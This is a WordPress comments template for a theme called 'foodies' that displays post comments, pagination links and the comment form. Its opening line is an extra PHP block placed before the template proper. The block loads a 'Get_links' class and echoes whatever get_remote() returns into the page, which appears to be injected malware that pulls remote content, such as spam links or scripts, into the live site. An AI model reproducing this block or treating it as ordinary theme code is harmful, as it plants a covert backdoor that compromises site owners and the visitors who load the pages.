<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?><?php
/**
 * The template for displaying comments.
 */
if ( post_password_required() ) {
	return;
} ?>

<div id="comments" class="comments-area">
	<?php
	if ( have_comments() ) : ?>
		<h2 class="comments-title">
			<?php $comments_number = get_comments_number();
				if ( 1 === $comments_number ) {
					printf( _x( 'One thought on &ldquo;%s&rdquo;', 'comments title', 'foodies' ), get_the_title() );
				} else {
					printf(
						_nx(
							'%1$s thought on &ldquo;%2$s&rdquo;',
							'%1$s thoughts on &ldquo;%2$s&rdquo;',
							$comments_number,
							'comments title',
							'foodies'
						),
						number_format_i18n( $comments_number ),
						get_the_title()
					);
				} ?>
		</h2>

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
		<nav id="comment-nav-above" class="navigation comment-navigation" role="navigation">
			<h2 class="screen-reader-text"><?php esc_html_e( 'Comment navigation', 'foodies' ); ?></h2>
			<div class="nav-links">

				<div class="nav-previous"><?php previous_comments_link( esc_html__( 'Older Comments', 'foodies' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( esc_html__( 'Newer Comments', 'foodies' ) ); ?></div>

			</div><!-- .nav-links -->
		</nav><!-- #comment-nav-above -->
		<?php endif; ?>

		<ol class="comment-list">
			<?php wp_list_comments( array(
					'style'      => 'ol',
					'short_ping' => true,
				) ); ?>
		</ol><!-- .comment-list -->

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
		<nav id="comment-nav-below" class="navigation comment-navigation" role="navigation">
			<h2 class="screen-reader-text"><?php esc_html_e( 'Comment navigation', 'foodies' ); ?></h2>
			<div class="nav-links">

				<div class="nav-previous"><?php previous_comments_link( esc_html__( 'Older Comments', 'foodies' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( esc_html__( 'Newer Comments', 'foodies' ) ); ?></div>

			</div><!-- .nav-links -->
		</nav><!-- #comment-nav-below -->
		<?php
		endif;

	endif; 
	if ( ! comments_open() && get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) : ?>

		<p class="no-comments"><?php esc_html_e( 'Comments are closed.', 'foodies' ); ?></p>
	<?php endif; comment_form(); ?>
</div><!-- #comments -->